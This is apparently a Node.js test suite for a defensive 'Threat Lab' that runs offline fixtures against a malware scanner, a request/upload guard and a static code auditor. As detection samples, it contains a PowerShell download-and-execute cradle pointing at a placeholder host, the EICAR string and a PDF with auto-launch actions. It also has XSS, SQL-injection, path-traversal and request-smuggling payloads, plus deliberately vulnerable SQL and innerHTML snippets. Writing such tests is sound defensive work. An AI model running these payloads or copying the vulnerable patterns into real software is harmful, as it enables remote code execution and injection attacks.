import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { createHash } from "node:crypto";
import os from "node:os";
import path from "node:path";
import { Readable, Writable } from "node:stream";
import { createThreatLab } from "../src/index.js";
import { EICAR_TEST_STRING } from "../src/fixtures.js";
import { createMalwareEngine } from "../../malware-engine/src/index.js";
import { createSecurityGuardScanner } from "../../malware-engine/src/security-guard-adapter.js";
import { createSecurityGuard } from "../../security-guard/src/index.js";
import { createUploadInspector } from "../../security-guard/src/upload-inspector.js";
import { auditProject } from "../../../src/adapters/filesystem/audit-project.js";
import { auditDatabaseProject } from "../../../src/adapters/filesystem/audit-database.js";
import { comparePngBuffers } from "../../../src/adapters/visual/png-diff.js";
import projectAuditConfig from "../../../config/project-audit.config.json" with { type: "json" };
import pngjs from "pngjs";

const { PNG } = pngjs;

const PNG_HEADER = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const TEST_MARKER = Buffer.from("deadbeef", "hex");
const HASH_FIXTURE = Buffer.from("JB Threat Lab exact SHA-256 fixture; inert bytes only.");
const HASH_FIXTURE_SHA256 = createHash("sha256").update(HASH_FIXTURE).digest("hex");
const EXPECTED_EICAR = Buffer.from(
  "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",
  "base64"
);

function makePng(changed = false) {
  const image = new PNG({ width: 2, height: 2 });
  for (let index = 0; index < image.data.length; index += 4) {
    image.data[index] = 20;
    image.data[index + 1] = 40;
    image.data[index + 2] = 60;
    image.data[index + 3] = 255;
  }
  if (changed) {
    image.data[0] = 250;
    image.data[1] = 0;
    image.data[2] = 0;
  }
  return PNG.sync.write(image);
}

async function createWorkspace(t) {
  const root = await mkdtemp(path.join(os.tmpdir(), "jb-threat-lab-engines-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  return root;
}

function outcome(status, summary, metrics = {}, findings = []) {
  return { status, summary, metrics, findings };
}

function createMemoryStore() {
  const quarantine = new Map();
  const approved = new Map();
  return {
    quarantine,
    approved,
    createWriteStream({ uploadId }) {
      const chunks = [];
      return new Writable({
        write(chunk, encoding, callback) {
          chunks.push(Buffer.from(chunk));
          callback();
        },
        final(callback) {
          quarantine.set(uploadId, Buffer.concat(chunks));
          callback();
        }
      });
    },
    async createReadStream({ uploadId }) {
      const bytes = quarantine.get(uploadId);
      if (!bytes) throw new Error("fixture missing from quarantine");
      return Readable.from([bytes]);
    },
    async promote({ uploadId, metadata, expectedSha256, expectedSize }) {
      const bytes = quarantine.get(uploadId);
      if (!bytes || bytes.length !== expectedSize) return { promoted: false };
      approved.set(uploadId, { bytes, metadata, expectedSha256 });
      quarantine.delete(uploadId);
      return { promoted: true };
    },
    async delete({ uploadId }) {
      quarantine.delete(uploadId);
      return { deleted: true };
    }
  };
}

function simulateGuardRequest(guard, url, {
  method = "GET",
  headers = {},
  rawHeaders = []
} = {}) {
  const response = {
    statusCode: 200,
    headersSent: false,
    writableEnded: false,
    headers: {},
    body: "",
    setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
    end(body = "") { this.body = String(body); this.writableEnded = true; }
  };
  let reachedApplication = false;
  guard.middleware({
    url,
    method,
    headers,
    rawHeaders,
    socket: { remoteAddress: "127.0.0.1" }
  }, response, () => { reachedApplication = true; });
  return { statusCode: response.statusCode, headers: response.headers, body: response.body, reachedApplication };
}

async function auditFixture(projectPath) {
  return auditProject(projectPath, {
    config: {
      ...projectAuditConfig,
      profile: "jb-threat-lab-static-fixture",
      advisories: { enabled: false, required: false }
    },
    scanOptions: {
      maxFiles: 100,
      maxFileBytes: 1_000_000,
      maxTotalBytes: 2_000_000,
      maxDepth: 5
    }
  });
}

test("JB Threat Lab exercises Malware Engine, Security Guard and Expert QA against safe local fixtures", async (t) => {
  const root = await createWorkspace(t);
  const malwareFixtures = path.join(root, "malware-fixtures");
  const malwareQuarantine = path.join(root, "malware-quarantine");
  const guardTemp = path.join(root, "guard-temp");
  const expertProject = path.join(root, "expert-project");
  const expertDatabaseProject = path.join(root, "expert-database-project");
  await Promise.all([
    mkdir(malwareFixtures),
    mkdir(guardTemp),
    mkdir(path.join(expertProject, "src"), { recursive: true }),
    mkdir(path.join(expertDatabaseProject, "src"), { recursive: true })
  ]);

  assert.deepEqual(Buffer.from(EICAR_TEST_STRING), EXPECTED_EICAR,
    "Threat Lab's EICAR fixture must match the exact harmless test string");

  const malwareEngine = createMalwareEngine({ quarantineDir: malwareQuarantine });
  const hashSignatureEngine = createMalwareEngine({
    quarantineDir: path.join(root, "hash-signature-quarantine"),
    hashSignatures: { [HASH_FIXTURE_SHA256]: "ThreatLab.ExactHashFixture" }
  });
  const sizeBoundedMalwareEngine = createMalwareEngine({
    quarantineDir: path.join(root, "size-bounded-quarantine"),
    maxFileBytes: 32
  });
  const uploadMalwareEngine = createMalwareEngine({
    quarantineDir: path.join(root, "upload-engine-quarantine"),
    byteSignatures: [{
      id: "threat-lab-upload-marker",
      name: "ThreatLab.TestMarker",
      patternHex: TEST_MARKER.toString("hex")
    }]
  });
  const guardScanner = createSecurityGuardScanner({
    malwareEngine: uploadMalwareEngine,
    tempDirectory: guardTemp,
    maxBytes: 1024 * 1024,
    engineName: "JB Threat Lab Fixture Scanner",
    version: "0.1.0"
  });
  const guard = createSecurityGuard({
    mode: "balanced",
    rateLimit: { enabled: false }
  });
  const lab = createThreatLab({ name: "JB Threat Lab", version: "0.1.0" });

  lab.registerTarget({
    id: "jb-malware-engine",
    kind: "security-engine",
    version: "0.6.2",
    capabilities: ["static-file-triage", "hash-signatures", "byte-signatures", "heuristics"],
    adapter: {
      async runScenario({ scenario }) {
        let extension = ".txt";
        let bytes;
        let expectedStatus;
        let engine = malwareEngine;
        let expectedReason;
        if (scenario.id === "malware.eicar.harmless-test") {
          bytes = EXPECTED_EICAR;
          expectedStatus = "malicious";
          extension = ".com";
        } else if (scenario.id === "malware.benign.no-false-positive") {
          bytes = Buffer.from("JB Threat Lab benign text fixture; inert data only.");
          expectedStatus = "no_match";
        } else if (scenario.id === "malware.suspicious.inert-script") {
          bytes = Buffer.from("IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')");
          expectedStatus = "suspicious";
          extension = ".ps1";
        } else if (scenario.id === "malware.hash-signature.exact-match") {
          bytes = HASH_FIXTURE;
          expectedStatus = "malicious";
          engine = hashSignatureEngine;
          extension = ".bin";
        } else if (scenario.id === "malware.coverage.size-limit-unknown") {
          bytes = Buffer.alloc(128, 0x41);
          expectedStatus = "unknown";
          expectedReason = "size_limit";
          engine = sizeBoundedMalwareEngine;
        } else if (scenario.id === "malware.pdf.active-actions-suspicious") {
          bytes = Buffer.from("%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /JavaScript 3 0 R /Launch 4 0 R >>\nendobj\n%%EOF\n", "latin1");
          expectedStatus = "suspicious";
          extension = ".pdf";
        } else {
          return outcome("skip", "No Malware Engine handler for this scenario");
        }
        const fixturePath = path.join(malwareFixtures, scenario.id.replaceAll(".", "-") + extension);
        await writeFile(fixturePath, bytes, { flag: "wx" });
        const report = await engine.scanFile(fixturePath);
        const passed = report.status === expectedStatus &&
          (expectedReason === undefined || report.reason === expectedReason) &&
          (scenario.id !== "malware.pdf.active-actions-suspicious" ||
            (report.detections.length === 0 && report.pdfAnalysis?.indicators.length >= 3));
        return outcome(
          passed ? "pass" : "fail",
          passed ? "Malware Engine returned the expected static triage status" : "Unexpected Malware Engine status or coverage reason",
          {
            actualStatus: report.status,
            expectedStatus,
            reason: report.reason ?? null,
            expectedReason: expectedReason ?? null,
            bytes: report.bytes,
            heuristicScore: report.heuristicScore ?? null,
            detections: report.detections?.length ?? 0,
            pdfIndicators: report.pdfAnalysis?.indicators.length ?? null
          },
          passed ? [] : [{
            code: "MALWARE_STATUS_MISMATCH",
            expected: expectedStatus,
            actual: report.status,
            expectedReason: expectedReason ?? null,
            actualReason: report.reason ?? null
          }]
        );
      }
    }
  });

  lab.registerTarget({
    id: "jb-security-guard",
    kind: "runtime-security",
    version: "0.1.0",
    capabilities: ["request-filtering", "upload-inspection", "fail-closed"],
    adapter: {
      async runScenario({ scenario }) {
        const requestCases = {
          "guard.request.xss-block": {
            url: "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            expectedStatus: 403
          },
          "guard.request.sqli-block": {
            url: "/search?q=%27%20OR%201%3D1",
            expectedStatus: 403
          },
          "guard.request.path-traversal-block": {
            url: "/files/%2e%2e/%2e%2e/private.txt",
            expectedStatus: 403
          },
          "guard.request.ambiguous-framing-block": {
            url: "/upload",
            method: "POST",
            headers: { "content-length": "5", "transfer-encoding": "chunked" },
            rawHeaders: ["Host", "example.test", "Content-Length", "5", "Transfer-Encoding", "chunked"],
            expectedStatus: 400
          }
        };
        if (requestCases[scenario.id]) {
          const requestCase = requestCases[scenario.id];
          const result = simulateGuardRequest(guard, requestCase.url, requestCase);
          const passed = result.statusCode === requestCase.expectedStatus && !result.reachedApplication;
          return outcome(passed ? "pass" : "fail", passed
            ? "Security Guard blocked the synthetic request at the expected boundary"
            : "Security Guard did not block the synthetic request as expected",
          {
            statusCode: result.statusCode,
            expectedStatus: requestCase.expectedStatus,
            reachedApplication: result.reachedApplication
          },
          passed ? [] : [{
            code: "GUARD_REQUEST_NOT_BLOCKED",
            expectedStatus: requestCase.expectedStatus,
            actualStatus: result.statusCode
          }]);
        }

        if (scenario.id === "guard.upload.malicious-block" || scenario.id === "guard.upload.unknown-quarantine") {
          const malicious = scenario.id === "guard.upload.malicious-block";
          const store = createMemoryStore();
          const inspector = createUploadInspector({
            store,
            scanner: guardScanner,
            maxBytes: 1024,
            scannerTimeoutMs: 5000,
            ingestTimeoutMs: 5000,
            allowedMimeTypes: ["image/png"]
          });
          const bytes = malicious
            ? Buffer.concat([PNG_HEADER, Buffer.from("TEST"), TEST_MARKER])
            : Buffer.concat([PNG_HEADER, Buffer.from("BENIGN-THREAT-LAB-FIXTURE")]);
          let actualCode = "none";
          try {
            await inspector.inspect({
              source: Readable.from([bytes]),
              fileName: "catalog-fixture.png",
              declaredMimeType: "image/png"
            });
          } catch (error) {
            actualCode = error.code ?? "unknown";
          }
          const expectedCode = malicious ? "MALWARE_DETECTED" : "SCAN_NOT_CLEAN";
          const passed = actualCode === expectedCode
            && store.approved.size === 0
            && (malicious ? store.quarantine.size === 0 : store.quarantine.size === 1);
          return outcome(passed ? "pass" : "fail",
            malicious
              ? "Malicious test marker was blocked and never promoted"
              : "No-match mapped to unknown and remained quarantined",
            { actualCode, expectedCode, approved: store.approved.size, quarantined: store.quarantine.size },
            passed ? [] : [{ code: "GUARD_UPLOAD_POLICY_MISMATCH" }]);
        }
        return outcome("skip", "No Security Guard handler for this scenario");
      }
    }
  });

  lab.registerTarget({
    id: "jb-expert-qa",
    kind: "qa-engine",
    version: "0.2.0",
    capabilities: ["local-static-audit", "security-rules", "regression-check"],
    adapter: {
      async runScenario({ scenario }) {
        if (scenario.id === "expert-qa.database.dynamic-query-and-tls") {
          const source = [
            "const pool = new pg.Pool({ ssl: false });",
            'export function findUser(input) { return pool.query("SELECT * FROM users WHERE name = " + input); }'
          ].join("\n");
          await writeFile(path.join(expertDatabaseProject, "src", "db.js"), source);
          const report = await auditDatabaseProject(expertDatabaseProject, {
            config: {
              ...projectAuditConfig,
              profile: "jb-threat-lab-database-fixture",
              advisories: { enabled: false, required: false }
            },
            scanOptions: {
              maxFiles: 100,
              maxFileBytes: 1_000_000,
              maxTotalBytes: 2_000_000,
              maxDepth: 5
            }
          });
          const rawQuery = report.diagnostics.some((item) => item.metadata?.detector === "dynamic-raw-query");
          const disabledTls = report.diagnostics.some((item) => item.metadata?.detector === "database-tls-disabled");
          const passed = report.databaseScope.complete && rawQuery && disabledTls &&
            report.databaseScope.databaseConnections === 0 &&
            report.databaseScope.networkRequests === 0;
          return outcome(passed ? "pass" : "fail",
            passed
              ? "Expert QA detected dynamic raw SQL and disabled database TLS without connecting to a database"
              : "Expert QA database audit did not return both expected static findings",
            {
              complete: report.databaseScope.complete,
              rawQueryDetected: rawQuery,
              disabledTlsDetected: disabledTls,
              evidenceFiles: report.databaseScope.databaseEvidenceFiles,
              databaseConnections: report.databaseScope.databaseConnections,
              networkRequests: report.databaseScope.networkRequests
            },
            passed ? [] : [{
              code: "EXPERT_QA_DATABASE_AUDIT_MISMATCH",
              rawQuery,
              disabledTls,
              complete: report.databaseScope.complete
            }]);
        }

        if (scenario.id === "expert-qa.visual.deterministic-diff") {
          const baseline = makePng(false);
          const changed = makePng(true);
          const identical = comparePngBuffers(baseline, baseline);
          const difference = comparePngBuffers(baseline, changed, { maxDiffPixelRatio: 0 });
          const passed = identical.passed === true &&
            difference.passed === false &&
            difference.diffPixels > 0 &&
            Buffer.isBuffer(difference.diffBuffer);
          return outcome(passed ? "pass" : "fail",
            passed
              ? "Expert QA visual comparison deterministically detected a local pixel difference"
              : "Expert QA visual comparison did not report the expected pixel difference",
            {
              identicalPassed: identical.passed,
              changedPassed: difference.passed,
              changedPixels: difference.diffPixels,
              changedPixelRatio: difference.diffPixelRatio,
              aiCalls: 0
            },
            passed ? [] : [{ code: "EXPERT_QA_VISUAL_DIFF_MISMATCH" }]);
        }

        if (scenario.id !== "expert-qa.static.unsafe-html-detected" &&
            scenario.id !== "expert-qa.static.repaired-html-regression") {
          return outcome("skip", "No Expert QA handler for this scenario");
        }
        const vulnerable = scenario.id === "expert-qa.static.unsafe-html-detected";
        const source = vulnerable
          ? "document.querySelector('#result').innerHTML = location.search;\n"
          : "document.querySelector('#result').textContent = location.search;\n";
        await writeFile(path.join(expertProject, "src", "app.js"), source);
        const report = await auditFixture(expertProject);
        const findings = report.diagnostics.filter((item) =>
          item.metadata?.detector === "html-sink-context"
        );
        const passed = vulnerable
          ? findings.some((item) => item.metadata?.classification === "unescaped-untrusted-source")
          : findings.length === 0;
        return outcome(passed ? "pass" : "fail",
          vulnerable
            ? "Expert QA detected the intentionally vulnerable dynamic HTML sink"
            : "Expert QA found no dynamic HTML sink after the safe textContent repair",
          { htmlSinkFindings: findings.length, analyzedFiles: report.analysisScope.filesAnalyzed },
          passed ? [] : [{ code: "EXPERT_QA_HTML_REGRESSION_MISMATCH", findings: findings.length }]);
      }
    }
  });

  const scenarios = [
    ["malware.eicar.harmless-test", "malware-static", "Detect the harmless EICAR test string.", "jb-malware-engine"],
    ["malware.benign.no-false-positive", "malware-static", "Do not flag a benign inert text fixture.", "jb-malware-engine"],
    ["malware.suspicious.inert-script", "malware-static", "Classify inert suspicious script text as suspicious, never confirmed malicious.", "jb-malware-engine"],
    ["malware.hash-signature.exact-match", "malware-signatures", "Confirm an exact configured SHA-256 fixture signature.", "jb-malware-engine"],
    ["malware.coverage.size-limit-unknown", "malware-coverage", "Return unknown when a file exceeds the configured scan budget.", "jb-malware-engine"],
    ["malware.pdf.active-actions-suspicious", "document-triage", "Classify PDF active-action indicators as suspicious, never confirmed malicious.", "jb-malware-engine"],
    ["guard.request.xss-block", "request-security", "Block a local synthetic XSS-pattern request.", "jb-security-guard"],
    ["guard.request.sqli-block", "request-security", "Block a local synthetic SQL injection-pattern request.", "jb-security-guard"],
    ["guard.request.path-traversal-block", "request-security", "Block a local encoded path-traversal request.", "jb-security-guard"],
    ["guard.request.ambiguous-framing-block", "request-security", "Reject conflicting HTTP message framing before application handling.", "jb-security-guard"],
    ["guard.upload.malicious-block", "upload-security", "Reject a synthetic signature match before file promotion.", "jb-security-guard"],
    ["guard.upload.unknown-quarantine", "upload-security", "Keep no-match uploads quarantined rather than approving them.", "jb-security-guard"],
    ["expert-qa.static.unsafe-html-detected", "static-code-security", "Detect an intentionally vulnerable HTML sink in source code.", "jb-expert-qa"],
    ["expert-qa.static.repaired-html-regression", "static-code-security", "Verify a repaired textContent implementation has no HTML-sink finding.", "jb-expert-qa"],
    ["expert-qa.database.dynamic-query-and-tls", "database-security", "Detect dynamic raw SQL and disabled TLS through local static database audit.", "jb-expert-qa"],
    ["expert-qa.visual.deterministic-diff", "visual-regression", "Detect a synthetic PNG pixel difference deterministically without AI.", "jb-expert-qa"]
  ];
  for (const [id, category, description, targetId] of scenarios) {
    lab.registerScenario({
      id,
      category,
      description,
      appliesTo: [targetId],
      safety: { safe: true, network: false, destructive: false, executesSample: false },
      tags: ["safe-fixture", "offline"]
    });
  }

  const report = await lab.run({
    metadata: {
      suite: "three-core-jb-engines",
      sampleExecution: false,
      networkRequests: 0,
      productionTargets: false
    }
  });

  assert.equal(report.totals.fail, 0, JSON.stringify(report.results.filter((item) => item.status === "fail"), null, 2));
  assert.equal(report.totals.pass, scenarios.length);
  assert.equal(report.totals.skip, 3 * scenarios.length - scenarios.length);
  assert.equal(report.results.length, 3 * scenarios.length);
  assert.deepEqual(
    new Set(report.results.filter((item) => item.status === "pass").map((item) => item.target.id)),
    new Set(["jb-malware-engine", "jb-security-guard", "jb-expert-qa"])
  );
});
